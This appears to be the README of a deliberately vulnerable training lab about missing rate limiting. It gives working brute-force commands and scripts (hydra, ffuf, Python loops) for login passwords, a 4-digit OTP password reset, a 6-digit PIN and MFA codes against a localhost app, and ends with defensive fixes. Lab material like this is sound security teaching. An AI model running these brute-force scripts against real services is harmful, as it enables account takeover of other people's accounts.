# Lab 15 — No Rate Limiting / Brute Force 🔴

**Port:** `8015` | **Stack:** Node.js + PostgreSQL + Redis | **Difficulty:** Beginner

---

## 🕳️ Security Loopholes

1. **No Rate Limiting on Login** — Unlimited attempts, no lockout, no CAPTCHA
2. **Weak PIN** — 6-digit numeric PIN (1,000,000 combinations) with unlimited guesses
3. **Weak OTP** — 4-digit OTP (10,000 combinations) with no expiry enforcement on guesses
4. **User Enumeration** — `/check-username` leaks whether a username exists
5. **MFA Bypass** — No rate limiting on MFA code verification

---

## 🎯 Attack Scenarios

### Scenario A — Brute Force Login with Hydra
```bash
docker compose up -d

# First — enumerate valid usernames
curl -X POST http://localhost:8015/check-username \
  -H "Content-Type: application/json" \
  -d '{"username": "admin"}'
# Returns: {"exists": true}

# Brute force with hydra using rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form \
  "localhost:8015/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -t 64

# Or with ffuf
ffuf -u http://localhost:8015/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -mr '"success":true'
```

### Scenario B — Brute Force 4-Digit OTP (Only 10,000 Combos)
```bash
# Request an OTP
curl -X POST http://localhost:8015/reset-password/request \
  -H "Content-Type: application/json" \
  -d '{"username": "admin"}'

# Brute force all 10,000 combinations (takes ~10 seconds with curl)
python3 -c "
import subprocess, json, sys

for i in range(10000):
    otp = str(i).zfill(4)
    result = subprocess.run(
        ['curl', '-s', '-X', 'POST', 'http://localhost:8015/reset-password/verify',
         '-H', 'Content-Type: application/json',
         '-d', json.dumps({'username':'admin','otp':otp,'new_password':'hacked'})],
        capture_output=True, text=True
    )
    if '\"success\":true' in result.stdout:
        print(f'OTP found: {otp}')
        sys.exit(0)
    if i % 500 == 0: print(f'Tried {i}...')
"
```

### Scenario C — Brute Force PIN with ffuf
```bash
# Generate 6-digit PIN wordlist
python3 -c "
for i in range(1000000):
    print(str(i).zfill(6))
" > pins.txt

# But start with common PINs first
cat > common_pins.txt << 'EOF'
000000
123456
654321
111111
999999
123123
EOF

ffuf -u http://localhost:8015/verify-pin \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","pin":"FUZZ"}' \
  -w common_pins.txt \
  -mr '"success":true'
```

### Scenario D — MFA Bypass (999,999 max combos)
```bash
# Brute force 6-digit MFA with Python async for speed
python3 << 'PYEOF'
import asyncio, aiohttp

async def try_code(session, code):
    async with session.post('http://localhost:8015/verify-mfa',
        json={'username': 'admin', 'code': code}) as resp:
        data = await resp.json()
        if data.get('success'):
            print(f"MFA CODE FOUND: {code}")
            return True
    return False

async def main():
    async with aiohttp.ClientSession() as session:
        # Try sequential from common patterns
        for i in range(900000, 1000000):
            code = str(i).zfill(6)
            if await try_code(session, code):
                break

asyncio.run(main())
PYEOF
```

---

## 🛠️ Tools

| Tool | Command |
|------|---------|
| `hydra` | `hydra -l admin -P rockyou.txt http-post-form "..."` |
| `ffuf` | Fast HTTP fuzzer — great for OTP/PIN brute force |
| `medusa` | `medusa -h localhost -u admin -P rockyou.txt -M http` |
| Burp Intruder | Cluster bomb / sniper attack on login |

---

## 🔐 How to Fix

```javascript
const rateLimit = require('express-rate-limit');

// 1. Rate limit login — 5 attempts per 15 minutes per IP
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many attempts. Try again in 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.post('/login', loginLimiter, handler);

// 2. Add account lockout after N failures (stored in Redis)
// 3. Use 6-digit time-based OTP (TOTP) with 30s window — not static codes
// 4. Enforce constant-time comparison for secrets
const crypto = require('crypto');
const safeCompare = (a, b) => crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));

// 5. Never expose user existence — always return same response
res.status(401).json({ error: 'Invalid credentials' }); // Same for wrong user AND wrong pass

// 6. Add CAPTCHA after 3 failed attempts
```
